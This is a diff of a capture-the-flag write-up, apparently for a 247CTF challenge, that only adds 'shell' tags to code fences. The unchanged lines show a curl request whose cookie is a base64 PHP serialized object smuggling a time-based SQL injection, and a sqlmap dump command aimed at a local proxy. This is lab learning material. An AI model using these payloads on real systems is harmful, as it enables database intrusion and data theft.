@@ -71,7 +71,7 @@ echo $final_payload;
 
 Let's try it :
 
-```
+```shell
 time curl -XGET https://a0351f3d2e04038e.247ctf.com/ -b '247=TzoxMDoiaW5zZXJ0X2xvZyI6MTp7czo4OiJuZXdfZGF0YSI7czo1MjoiMFhNb2hvbWllc3RlcicpOyBzZWxlY3QgMSA9IHJhbmRvbWJsb2IoOTk5OTk5OTk5KTstLSI7fQ==.0e'
 ```
 
@@ -139,11 +139,11 @@ echo $response;
 ```
 
 we can deploy php server locally using: 
-```
+```shell
 php -S 0.0.0.0:80
 ``` 
 using sqlmap command: 
-```
+```shell
 sqlmap -u "http://127.0.0.1:80/?payload=test" -p "payload" --dbms sqlite --technique=T --dump --level 5 --risk 3 --no-cast  --random-agent
 ```
 
